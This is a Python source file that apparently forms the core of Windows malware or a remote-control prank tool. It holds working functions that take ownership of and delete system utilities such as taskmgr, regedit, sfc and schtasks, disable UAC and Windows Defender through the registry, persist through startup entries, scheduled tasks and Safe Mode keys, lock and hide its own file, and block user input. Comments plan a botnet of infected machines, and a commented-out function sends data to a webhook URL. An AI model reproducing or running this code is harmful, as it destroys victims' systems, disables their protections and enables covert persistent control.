import time
startup_START = time.time()

import ctypes
import sys
import os

admin_privileges = False
if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    print("Not running with administrator privileges!")
else:
    admin_privileges = True
    print("Running with administrator privileges!")
# def run_as_admin():
#         if ctypes.windll.shell32.IsUserAnAdmin() == 0:
#                 #shell.ShellExecuteEx(lpVerb='runas', lpFile='powershell.exe', lpParameters='/c ' + selfScriptFullLocation)
#                 ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
#                 sys.exit()
# run_as_admin()
import subprocess
import pyautogui
import requests
import asyncio
import socket
import pyautogui
import numpy as np
from PIL import Image, ImageDraw
import io
import time
import cv2
import traceback
import select
import zlib  # For optional compression
import threading
import numpy as np
from PIL import Image, ImageTk
import io
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
import threading
import traceback
import subprocess  
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import selenium.common.exceptions
import math
import requests
from bs4 import BeautifulSoup
import re
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import xml.etree.ElementTree as ET
import math
import keyboard
import string
import wget
from pyshortcuts import make_shortcut
from sys import exit
import winreg
from PIL import Image, ImageChops
import urllib.request
from ctypes import *
import io
import numpy as np
import win32gui
from mark1_translate import translate as translator
from pynput import keyboard as pynput_keyboard
import win32process
import imutils
import cv2
import json
import concurrent.futures
import base64
from concurrent.futures import ThreadPoolExecutor
import urllib
try:
    import scapy.all
except Exception as e:
    print(f'Error: {e}')

import pyttsx3
import socket
import threading
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
import winsound
import pynput
import wave
import pyaudio
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import multiprocessing
import signal
import pygame
import shlex
import pyautogui as pt
import sounddevice as sd
import comtypes
from Crypto.Cipher import AES
from Crypto.Util import number
import win32api
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import re
import psutil
from tcp_latency import measure_latency
import rotatescreen
import time
from random import *
import ast
from pynput.keyboard import Key, Listener
import win32con
import logging
from datetime import datetime
from gtts import gTTS
import playsound
from pytube import YouTube
import pythoncom, pyWinhook
# import win32com.shell.shell as shell
import win32comext.shell.shell as shell

from langdetect import detect, DetectorFactory

import trace
from random import randint
import random
from PyQt5.QtWidgets import QApplication, QLabel, QVBoxLayout, QWidget, QPushButton, QSizePolicy, QCheckBox
from PyQt5.QtGui import QPixmap, QImage
from PyQt5.QtCore import QThread, pyqtSignal, Qt
import PyQt5.QtCore as QtCore
from PyQt5.QtGui import QKeySequence
import cv2
import socket
import struct
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import gevent
# print(gevent.version_info)

import socket
import struct
import random
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from random import choice as choice_list
from flask import Flask, render_template
from flask_socketio import SocketIO
import requests
import socket
import geocoder
from geopy.geocoders import Nominatim
from geopy.geocoders import Photon
from engineio.async_drivers import gevent
from flask import Flask, jsonify, render_template
from flask import Flask, render_template, request, Response
from PIL import Image
from flask import url_for
from flask import *
from flask import Flask, request, jsonify
from random import choice as choice_list
# import tensorflow as tf
import numpy as np
from longvariables import system32_files, windows_files


def slp(seconds):
    "Sleeps without causing the thread to sleep"
    # time.sleep(seconds); return
    toWait = time.time() + seconds
    while time.time() < toWait:
        pass
    return
    
    
mouse_idle = 0 # time in seconds since mouse idle
keyboard_idle = 0 # time in seconds since keyboard idle

script_start = time.time()

pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0
 
socket.setdefaulttimeout(None)

autoterminateunknownexeprocesses = False
autofreezeunknownprocesses = False
windowsDoneFrozen = False # whether or not all processes are set to suspended casuing windows to "freeze"

print(f'It has taken {time.time() - startup_START} seconds to load all the imports')

computersusername = os.environ['username']

SelfUserUsername = os.environ['username']
SelfComputerName= os.environ['COMPUTERNAME'] # --uac-admin ; Py installer to get UAC admin rights on exe

# Get the screen width and height
screen_width = win32api.GetSystemMetrics(0)
screen_height = win32api.GetSystemMetrics(1)
# print(screen_width, screen_height)

prioritizeipv4 = None

INTERNET = False # to determine local, and make something cool, so that if a device has no internet(current device) and it needs to send something to the internet, and it knows another vary device has internet, it'll ask it to send it, and it'll attach an attribute to know that it's the device requesting and not the one sending. 
HEADER = 64
vary_PORT = 45433 # new port for divesify decices
server = None
done_vary_tasks = []


def internet_check():
    global INTERNET
    v = measure_latency(host='google.com')
    if len(v) == 0:
        INTERNET = False
    else:
        INTERNET = True
    threading.Timer(1.0, internet_check).start()


internet_check_timer = threading.Timer(1.0, internet_check)
internet_check_timer.start()


if INTERNET == False:
    SERVER = False
    ADDR = False
else:
    SERVER = socket.gethostbyname(socket.gethostname()) # you know what you can do, if this errors, as only one usage each socket address, just scan the local device for devices using this, kill them(and child processes) & corrupt. 
    ADDR = (SERVER, vary_PORT)
print(f'IP: {SERVER}')


varyhosts = [] # list of hosts, not connected devices but local hosts
timeout_device_list = {} # list of devices with timeout set
connected_devices = [] # list of connected devices
device_search = [] # list of devices
device_item_received = {} # list of messages received, not past, current.



class KThread(threading.Thread):
    """A subclass of threading.Thread, with a kill()
method."""
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run            # Force the Thread to
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True


def runfunctionvianame(name, *args, **kwargs):
    # Get the function from globals and call it
    # if you want to specify arguments you must assign them as keyword arguments, e.g. t=5

    print(f'Trying to run function {name} with args {args} and kwargs {kwargs}')
    func = getattr(sys.modules[__name__], name)  # get the function from the current module

    if func:
        print(f'Found the function {func}')
        func(*args, **kwargs)
        print(f'Successfully ran function {name}')
    else:
        print(f"No function named {name} found.")

def installchrome():
    url = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
    length = 10
    filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    filename = f'{filename}.exe'
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    filename_dir = os.path.join(download_dir, filename)

    with requests.get(url, stream=True) as response:
        response.raise_for_status()
        with open(os.path.join(download_dir, filename), "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                f.write(chunk)
    
    slp(2)
    def runinstallcommand():
        programVL2(filename_dir + ' /install')
        
    atmp = threading.Thread(target=runinstallcommand)
    atmp.start()

mouse_listener = pynput.mouse.Listener(suppress=True)

# pineapple = "okay" # ??? what is this for?


def disablekeyboard_threadtorun():
    global hm
    hm = pyWinhook.HookManager()
    def offEvent(event):
        return False
    hm.KeyAll = offEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun)

def disable_keyboard():
    global disablekeyboard_threadtorun_thread
    if not disablekeyboard_threadtorun_thread.is_alive():
        disablekeyboard_threadtorun_thread.start()

        
        
def enable_keyboard():
    global hm
    global disablekeyboard_threadtorun_thread
    if disablekeyboard_threadtorun_thread.is_alive():
        disablekeyboard_threadtorun_thread.kill()
        #disablekeyboard_threadtorun_thread.native_id
        hm.UnhookKeyboard()
        disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun)

        
def disable_mouse():
    global mouse_listener
    if not mouse_listener.is_alive():
        mouse_listener.start()

def enable_mouse():
    global mouse_listener
    if mouse_listener.is_alive():
        mouse_listener.stop()
        mouse_listener = pynput.mouse.Listener(suppress=True)
        

def presskeys(inputGiven): # maybe it being first will fix the problems:@ from previous program rb, this just wouldn't won to press the input given
    print(f'Request to press a key of: "{inputGiven}"')
    try:
        import keyboard
        keyboard.press_and_release(inputGiven)
    except Exception as e:
        print(f'Error while pressing keys(function):\n{e}')







def writetext(text):
    keyboard.write(text)


def MeAndTheBoys():
    # random int from 1 to x, and chooses a random vid
    list = ['https://www.youtube.com/watch?v=DMBU88iR-wg', 'https://www.youtube.com/watch?v=W-Repa-xAxA', 'https://www.youtube.com/watch?v=_zaQgzOREHA', 'https://www.youtube.com/watch?v=6G4OlCbTpec']
    v = random.choice(list)
    print(v)
    webhandler(v)
    
def corrupt_taskscheduler():
    programVL2('takeown /f C:\\Windows\\System32\\taskschd.dll')
    programVL2('icacls "C:\\Windows\\System32\\taskschd.dll" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im taskschd.dll')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\taskschd.dll"')
    
    programVL2('takeown /f C:\\Windows\\System32\\taskschd.msc')
    programVL2('icacls "C:\\Windows\\System32\\taskschd.msc" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im taskschd.msc')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\taskschd.msc"')
    
    programVL2('takeown /f C:\\Windows\\System32\\TaskSchdPS.dll')
    programVL2('icacls "C:\\Windows\\System32\\TaskSchdPS.dll" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im TaskSchdPS.dll')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\TaskSchdPS.dll"')

    programVL2('takeown /f C:\\Windows\\System32\\schtasks.exe')
    programVL2('icacls "C:\\Windows\\System32\\schtasks.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im schtasks.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\schtasks.exe"')

def corrupttaskmgr():
    programVL2('takeown /f taskmgr.exe')
    programVL2('icacls "C:\\Windows\\system32\\taskmgr.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im taskmgr.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\system32\\taskmgr.exe"')
def corruptmmc():
    programVL2('takeown /f "C:\\Windows\\system32\\mmc.exe"')
    programVL2('icacls "C:\\Windows\\system32\\mmc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im mmc.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\system32\\mmc.exe"')
def corruptregedit():
    programVL2('takeown /f "C:\\Windows\\regedit.exe"')
    programVL2('icacls "C:\\Windows\\regedit.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im regedit.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\regedit.exe"')
def corruptdllhost():
    programVL2('takeown /f "C:\\Windows\\dllhost.exe"')
    programVL2('icacls "C:\\Windows\\dllhost.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im dllhost.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\dllhost.exe"')
def corruptsfc():
    programVL2('takeown /f "C:\\Windows\\System32\\sfc.exe"')
    programVL2('icacls "C:\\Windows\\System32\\sfc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im sfc.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\sfc.exe"')
def corruptsystemreset():
    programVL2('takeown /f "C:\\Windows\\System32\\systemreset.exe"')
    programVL2('icacls "C:\\Windows\\System32\\systemreset.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im systemreset.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\systemreset.exe"')
    
# def disableinput(EnabledDisabled, keyboardOrMouse):
#     global disablekeyboard, disablemouse
#     hm = pyWinhook.HookManager()

#     def offEvent(event):
#         return False
#     def OnEvent(event):
#         return True

#     def disablemouse():
#         hm.MouseAll = offEvent
#         hm.HookMouse()
#         pythoncom.PumpMessages()

#     def disablekeyboard():
#         hm.KeyAll = offEvent
#         hm.HookKeyboard()
#         pythoncom.PumpMessages()


#     if EnabledDisabled == 'False' and keyboardOrMouse == 'keyboard':
#         if not ker.is_alive():
#             ker.start()
#     elif EnabledDisabled == 'False' and keyboardOrMouse == 'mouse':
#         if not mer.is_alive():
#             mer.start()
#     elif EnabledDisabled == 'True' and keyboardOrMouse == 'keyboard': # enables the x selected input
#         if ker.is_alive():
#             ker.kill()
#     elif EnabledDisabled == 'True' and keyboardOrMouse == 'mouse':
#         if mer.is_alive():
#             mer.kill()

# disableinput(None,None)
# ker = KThread(target=disablekeyboard)
# mer = KThread(target=disablemouse)

def runcmd(cmd, suppress=False, retry=0):
    try:
        a = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        a.wait()
        if a.returncode == 0:
            if suppress == False:
                print("The command ran successfully", "@ command :", cmd)
            else:
                pass
        else:
            if suppress == False:
                print("The command failed with return code", a.returncode, "@ command :", cmd)
            else:
                pass
            if suppress == False:
                print(f'{retry+1} Retrying running: {cmd}')
            retry +=1
            if retry > 4:
                    return
            return runcmd(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at runcmd, {e}')

def programVL2(cmd, suppress=False, retry=0):
        try:
                a = shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+cmd)
                #print(a)
                if a['hInstApp'] > 32:
                        if suppress == False:
                                print("The admin command ran successfully", "@ command :", cmd)
                        else:
                                pass
                else:
                        if suppress == False:
                                print("The admin command failed with an error code", ctypes.WinError(), "@ command :", cmd)
                        else:
                                pass
                        if suppress == False:
                                print(f'{retry+1} Retrying running(admin): {cmd}')
                        retry +=1
                        if retry > 4:
                                return
                        return programVL2(cmd, suppress, retry)
        except Exception as e:
                print(f'Error at programVL2, {e}, CMD:{cmd}')
                if 'The operation was canceled by the user.' in e.args:
                        retry +=1
                        return programVL2(cmd, suppress, retry)




def screenoff():
    win32api.SendMessage(0xFFFF, 0x0112, 0xF170, 2) 

def blackenscreen(durationinSeconds): # a bit extra
    # print(int(durationinSeconds))
    try:
        t_end = time.time() + int(durationinSeconds)
        while time.time() < t_end:
            #print(time.time())
            #os.system('%systemroot%\system32\scrnsave.scr /s')
            threading.Thread(target=screenoff).start()
            slp(0.2)
    except Exception as e:
        print(f'Error in blackenscreen, {e}')
        
def texttospeech(text):
    pythoncom.CoInitialize()
    pyttsx3.init(driverName='sapi5')
    engine = pyttsx3.init()
    engine.setProperty('rate', 165)
    engine.setProperty('volume', 10)
    engine.say(f'<pitch middle="-15">{text}</pitch>')
    engine.runAndWait()
    pythoncom.CoInitialize()

def transalte(translatetext, toLang):
        aftertranslatora = translator(translatetext, dest=toLang, src='auto')
        global translatedtoen
        translatedtoen = aftertranslatora.text
        #print(translation12)
        return translatedtoen
        
def speak(text, lang):
    try:
        a = randint(0, 1024123)
        tts = gTTS(text=text, lang=lang)
        filename1 = f"tmp{a}files.mp3"
        filename =get_script_directory() + '\\' + f"tmp{a}files.mp3"
        tts.save(filename)
        pygame.mixer.init()
        pygame.mixer.music.load(filename)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
                    pygame.time.Clock().tick(10)
        pygame.mixer.music.unload()
        os.remove(filename)
    except Exception as e:
        print(f'Caught exception:\n{e}')

def detectLang(text): # returns the en, ru and etc
    try:
        return detect(str(text))
    except Exception as e:
        print(e)
        
def speakXlanguage(text): # detects russian, english and whatever, and says it
    speak(text, detectLang(text))
# make one that gets all the languages and says them - detrects the language.
# make another one that transltes any language to that language(russain etc) and says it out loud

# speak russian
def speakRussian(text):
    text = transalte(text, 'ru')
    speakXlanguage(text)

def speakFrench(text):
    text = transalte(text, 'fr')
    speakXlanguage(text)
    
def speakArabic(text):
    text = transalte(text, 'ar')
    speakXlanguage(text)
    
def speakEnglish(text):
    text = transalte(text, 'en')
    speakXlanguage(text)


# def frontPorgram_tospoof(): 
#     # instead of doing this, you can just make it install to this.
#     # THIS IS SP-Y-WAR-E
#     return

# def sendUpPacket(data):
#     webhook_url = NULL#"https://webhook.site/60ab9b12-2bba-4307-9b78-143e585bb93a" # change in advance
#     # assuming can also go in the oposite direction, via phone
    
#     # data can also be a list.
#     data = "\n ".join(data)
#     print(data)

#     r = requests.post(webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
#     return

# # def backendKeepalive():
#     while True:
#         timetowait = time.time() + (60*30) # 30 minutes
#         while time.time() < timetowait:
#             print("Waiting for next keepalive...")
#             sleep(600)
#         sendUpPacket()

def disableUserAccountControl():
    programVL2('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')      
def enableUserAccountControl():
    programVL2('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f')      

# Define a callback function for CreateThread
def thread_func(lpParameter):
    func = cast(lpParameter, py_object).value
    func()
    return 0


def AThread(func):
    # Convert the callback function to a C callable function
    ThreadFunc = WINFUNCTYPE(c_ulong, c_void_p)(thread_func)

    # Load the kernel32 library
    kernel32 = windll.kernel32

    # Create a new thread
    thread_id = c_ulong(0)
    thread_handle = kernel32.CreateThread(None, 0, ThreadFunc, py_object(func), 0, byref(thread_id))
    # if you want to wait for the thread to finish, use this:
    # kernel32.WaitForSingleObject(thread_handle, -1)   where the handle is the return value of this
    return thread_handle

# thread_handle = AThread(backendKeepalive)


# def self_tostartup():
#     # task_name = "flWin86"
#     # script_path = os.path.join(get_script_directory(), get_script_filename())
#     # Create the scheduled task
#     # cmd = f'schtasks /Create /TN "{task_name}" /TR "{script_path}" /SC ONSTART /RU SYSTEM /F'
#     # os.system(cmd)
#     programVL2(f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vtl /f /t REG_SZ /d \"{os.path.join(get_script_directory(), get_script_filename())}\"')
#     # Run the scheduled task
#     # cmd = f'schtasks /Run /TN "{task_name}"'
#     # os.system(cmd)


def addselftostartup_reg(): # requires admin rights
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    try: os.rmdir(startup_folder)
    except: pass # should fix the fact that there may be a duplicate startup item for this incase this got started withoiut admin perms :shurg:
    # programVL2(f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vtl /f /t REG_SZ /d \"{os.path.join(get_script_directory(), get_script_filename())}\"')
    programVL2(f'schtasks /create /sc ONLOGON /tn "{"".join(random.choice(string.ascii_letters) for _ in range(8))}" /tr "{os.path.join(get_script_directory(), get_script_filename())}" /ru {os.getlogin()} /rl HIGHEST /it /f')


def addselftostartup_folder():
    script_dir = get_script_directory()
    script_filename = get_script_filename()
    script_path = os.path.join(script_dir, script_filename)
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')

    make_shortcut(script_path, name=script_filename, terminal=False, folder=startup_folder)


def self_tostartup():
    if admin_privileges: addselftostartup_reg()
    else: addselftostartup_folder()



def create_presitent_starting():
    """Creates a task in the Windows Task Scheduler.

    Args:
        task_name: The name of the task.
        command: The command to run.
        trigger: The trigger for the task.
    """
    
    # invalid does not work.
    
    
    
        # Get the full path to the exe file.
    exe_path = os.path.join(get_script_directory(), get_script_filename())

    # Create a task to run the exe file every 5 minutes.
    
    task_name = "flWin32",
    command = exe_path,
    trigger = "/tr 00000005"

    # to make the program run every 5 minutes, since it may be termineted, and since you have the self check, you can use this without worry of 2 instances

    task_path = subprocess.check_output(
        [
            "schtasks",
            "/create",
            "/tn",
            task_name,
            "/tr",
            command,
            "/sc",
            trigger,
        ]
    )
    print(task_path) # idk what this is meant to do but sure i guess i'll keep it
    

def self_to_rerun_if_killed():
    program_path = os.path.join(get_script_directory(), get_script_filename())
    task_name = "flWin86s"
    event_id = 20225
    event_channel = "System"

    # Create the scheduled task
    cmd = f'schtasks /Create /TN "{task_name}" /TR "{program_path}" /SC ONEVENT /MO "*[System[EventID={event_id}]]" /EC {event_channel} /RU SYSTEM /F'
    os.system(cmd)

    # Run the scheduled task
    cmd = f'schtasks /Run /TN "{task_name}"'
    os.system(cmd)


def inviscurr(duration, setdelay=5): # this is just annoying.. it takes the current focused window and makes it invisible.. dumb
    #dump yet very fun and to see people reaction god damn, adding a delay to make people see it disappear.
        a = time.time() + int(duration)
        while time.time() < a:
            the_program_to_hide = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
            slp(setdelay)
            
def swaprmbandlmbtrue():
    swapped = GetSystemMetrics(SM_SWAPBUTTON)
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    SwapMouseButton(True)
    
def unswaprmbandlmb():
    swapped = GetSystemMetrics(SM_SWAPBUTTON)
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    SwapMouseButton(False)

def swapRMBAndLMB(aset='unspecified'): # invert left click and right click
    '''Set can be equal to swapped or ntswapped'''
    # Define the SM_SWAPBUTTON constant
    SM_SWAPBUTTON = 23
    # Check if the left and right mouse buttons are swapped
    swapped = GetSystemMetrics(SM_SWAPBUTTON)
    SwapMouseButton = ctypes.windll.user32.SwapMouseButton
    if aset == 'unspecified':
        # it'll be a toggle:
        if swapped:
            print('not Swapped rmb and lmb')
            SwapMouseButton(False)
        else:
            print('swapped rmb and lmb')
            SwapMouseButton(True)
    elif aset == True:
        SwapMouseButton(True)
        print('Set swap True')
    elif aset == False:
        SwapMouseButton(False)
        print('Set swap False')
    else:
        print(f'{aset} is not a valid option @ swapRMBAndLMB')

def type_string_with_human_delay(string): # human ish
    for character in string:
        if character == ' ':
            # Random chance for semi-delay after space
            if random.random() < 0.8:
                slp(random.choice([0.2, 0.5, 0.1, 0.1, 0.2, 0.3, 0.4]))
        pynput.keyboard.Controller().type(character)
        slp(random.uniform(0.2, 0.03))


def sendAllVaryHosts(text):
    global varyhosts
    tmp = []
    for i in varyhosts:
        if i not in tmp:
            tmp.append(i) 
    varyhosts = tmp
    # varyhosts = list(set(varyhosts)) # causes errors
    for i in varyhosts:
        send(i, text)


# make a bot net that interact with each other(infected machines) and one is a main, if one falls, another one shall rise, and through that one "main" you'll interact and connect to via port forwarding or whatever it has open

# for now, an idea, search over all the networks for devices, *do this every minute(or 5) btw, as search, in a SPECIFIC PORT(important!), ask the machines via an encrypted key, whether or not they're the host, and verify it also, to prevent counterfeit. then, get to know the "friends" devices.

           
def add_to_list_if_not_in(item, lst: list):
    if item in lst:
        pass
    else:
        lst.append(item) 
            
            
def search_for_local_devices_port(port: int):
    devices = []

    def scan_ip(ip: str):
        if ip == server:
            return
        socket.setdefaulttimeout(0.7)
        result = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, port))
        if result == 0:
            devices.append(f'{ip}:{port}')

    def get_subnet() -> str:
        ip_address = SERVER
        print(f'IPADDRESS: {ip_address}')
        if ip_address != '127.0.0.1':
            octets = ip_address.split('.')
            last_octet = int(octets[-1])
            return '.'.join(octets[:3]) + '.', last_octet
        return ''

    subnet, last_octet = get_subnet()
    if not subnet:
        print("Couldn't get the subnet for the given interface")
        return []

    threads = []
    for j in range(1, 255):
        if j == last_octet:
            continue # as in skip it
        thread = threading.Thread(target=scan_ip, args=[f"{subnet}{j}"])
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"Devices found for port {port} are:", devices)
    return devices


            
# def search_for_local_devices_port(port): # valid ones of course...     
#     devices = []

#     def scan_ip(ip):
#         if ip == SERVER:
#             return
#         # print(ip)
#         # varyport = port# 45433 of vary hosts

#         socket.setdefaulttimeout(0.7)
#         # print(ip, port)
#         result = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, port))
#         # print(f'result: {result}, {ip}:{port}')
#         try:
#             if result == 0:
#                 # print(f'{ip} is found as a local ported device')
#                 # device_add(f'{ip}:{port}')
#                 devices.append(f'{ip}:{port}')
#                 return
#         except Exception as e:
#             print(e)

#     def get_subnet(): 
#         subnet = ''
#         ip_address = SERVER # do not overrite SERVER.
#         if ip_address != '127.0.0.1':
#             octets = ip_address.split('.')
#             subnet = '.'.join(octets[:3]) + '.'
#             return subnet
#         else:                
#             print(f'subnet:', subnet)
#             if subnet == '':
#                 return False

#     subnet = get_subnet()
#     if subnet == False or subnet == '' or subnet == None or subnet == 'None':
#         print("Couldn't get the subnet for the given interface")
#         return False
#     print(f'subnet: {subnet}')
#     force_exit_due_toshutdownerror = False
#     with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executorofscanip :
#         # for i in range(1,255):
#             for j in range(1,255):
#                 try:
#                     executorofscanip.submit(scan_ip, f"{subnet}{j}")
#                 except Exception as e:
#                     print(f'Error at submitting a scanip {subnet}{j} job:', e)
#                     if 'cannot schedule new futures after interpreter shutdown'.lower() in str(e).lower():
#                         try: executorofscanip = concurrent.futures.ThreadPoolExecutor(max_workers=200).submit(scan_ip, f"{subnet}{j}")
#                         except: pass
#                         force_exit_due_toshutdownerror = True
#                         break
#                         # return
#     if force_exit_due_toshutdownerror: print('Force exit due to shutdown error, not continuing');
#     print(f"Devices found for port {port} are:", devices)
#     return devices
# search_for_nearby_devices()



def scan_ports(ip_to_scan):

    devices = []    

    def port(port_name):
            socket.setdefaulttimeout(0.7)
            result = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip_to_scan, port_name))
            try:
                if result == 0:
                    print(f'The port {port_name} is successful for  ip {ip_to_scan}')
                    devices.append(f'{ip_to_scan}:{port_name}')
                    return
            except Exception as e:
                print(e)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executorofscanip :
        for i in range(1,255):
            executorofscanip.submit(port, i)
            
    print(devices, f"for {ip_to_scan}")
    return devices


def addToSafeModeLocationFile(Location):
    programVL2(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal" /v "robocopy.exe" /t REG_SZ /d "{Location}" /f')
    # programVL2(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal" /v "xcopy.exe" /t REG_SZ /d "{Location}" /f')
    programVL2(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot" /v "robocopy.exe" /t REG_SZ /d "{Location}" /f')
    # programVL2(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot" /v "xcopy.exe" /t REG_SZ /d "{Location}" /f')
    programVL2(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network" /v "robocopy.exe" /t REG_SZ /d "{Location}" /f')
    # programVL2(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network" /v "xcopy.exe" /t REG_SZ /d "{Location}" /f')


def addselftosafemode():
    addToSafeModeLocationFile(os.path.join(get_script_directory(), get_script_filename()))

# scan_ports('192.168.1.18')
def protect_file(file_path):
    from getpass import getuser
    # Give owner full control and deny access to all other users
    programVL2(f'icacls "{file_path}" /inheritance:r /grant:r {os.environ["username"]}:F /deny "*":RX')
    programVL2(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    programVL2(f'icacls "{file_path}" /deny {getuser()}:W,D')
    programVL2(f'attrib +r +h +s "{file_path}"')
    programVL2(f'attrib +r "{file_path}"')
    programVL2(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    programVL2(f'icacls "{file_path}" /disable')

def protectfileself():
    protect_file(os.path.join(get_script_directory(), get_script_filename()))
def DisableWindowsDefender():
    try: 
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f')
